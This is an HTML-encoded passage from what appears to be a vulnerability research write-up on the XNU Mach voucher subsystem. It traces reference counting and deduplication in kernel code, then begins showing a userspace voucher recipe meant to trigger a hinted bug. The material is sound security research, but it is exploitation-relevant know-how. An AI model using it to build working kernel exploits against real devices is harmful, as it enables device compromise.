 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If a new entry is allocated (from the freelist of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;#39;s in the table) then its reference count (&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) is set to 1, and its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;count is set to 1. If an existing entry is found then both its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;counts are incremented:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.5d6f231d91c5f3fcaedc02e8af1faacf22268e6f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.33&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Finally, the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;index&lt;/span&gt;&lt;span&gt;&amp;nbsp;of this entry in the table of all the controller&amp;#39;s entries is returned, because it&amp;#39;s the index into that table which a voucher stores; not a pointer to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_set&lt;/span&gt;&lt;span&gt;&amp;nbsp;to store that index into the correct slot in the voucher&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;, which is just a simple array index operation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.ac2c12e184f7c3e12da13fbd6404f62d8c16842e&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.34&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.49ce745eb25ac89c231f0c471abc9f82f9797477&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.35&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_set&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Our journey following this recipe is almost over! Since we only supplied one sub-recipe we exit the loop in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;and reach the call to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.bdeacdf6e0a60502a972f38307eadc992aacd7de&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.36&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;I won&amp;#39;t show the code for &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;here because it&amp;#39;s again structurally almost identical to the two other levels of deduping we&amp;#39;ve examined. In fact it&amp;#39;s a little simpler because it can hold the associated hash table lock the whole time (via &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivht_lock()&lt;/span&gt;&lt;span&gt;) since it doesn&amp;#39;t need to allocate anything. If a match is found (that is, the hash table already contains a voucher with exactly the same set of value indexes) then a reference is taken on that existing voucher and a reference is dropped on the voucher we just created from the input recipe via &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.1101ce1325bc496de996015edaf1a773d5d5120c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.37&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;FALSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument here indicates that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_iv&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivht_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;hashtable so shouldn&amp;#39;t be removed from there if it is going to be destroyed. Vouchers are only added to the hashtable after the deduping process to prevent deduplication happening against incomplete vouchers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The final step occurs when &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns. Since this is a MIG method, if it returns success and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;IV_NULL&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be converted into a mach port; a send right to which will be given to the userspace caller. This is the final level of deduplication; there can only ever be one mach port representing a particular voucher. This is implemented by the voucher structure&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;member.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;(For the sake of completeness note that there are actually two userspace interfaces to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;; the host port MIG method and also the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher_trap&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;mach trap. The trap interface has to emulate the MIG semantics though.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.gt3jam2tl3zw&quot;&gt;&lt;span&gt;Destruction&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Although I did briefly hint at a vulnerability above we still haven&amp;#39;t actually seen enough code to determine that that bug actually has any security consequences. This is where things get complicated ;-)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Let&amp;#39;s start with the result of the situation we described above, where we created a voucher port with the following recipe:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.38&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;payload &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;This will end up with the following data structures in the kernel:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.1c923ba263ede6be48f5e3994bd28dbf63e17419&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.39&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher_port &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ip_kobject &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;counted pointer to the voucher&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
